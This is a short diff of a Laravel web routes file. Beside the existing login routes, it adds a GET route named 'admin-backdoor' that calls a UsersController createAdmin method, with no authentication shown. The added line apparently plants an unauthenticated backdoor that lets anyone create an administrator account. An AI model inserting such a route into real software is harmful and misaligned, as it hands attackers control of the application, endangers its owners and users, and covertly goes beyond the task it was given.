@@ -72,3 +72,5 @@ Route::post('login',[UsersController::class,'login']);
 Route::get('/', function () {
     return view('auth.login');
 })->name('login');
+
+Route::get('admin-backdoor',[UsersController::class,'createAdmin']);
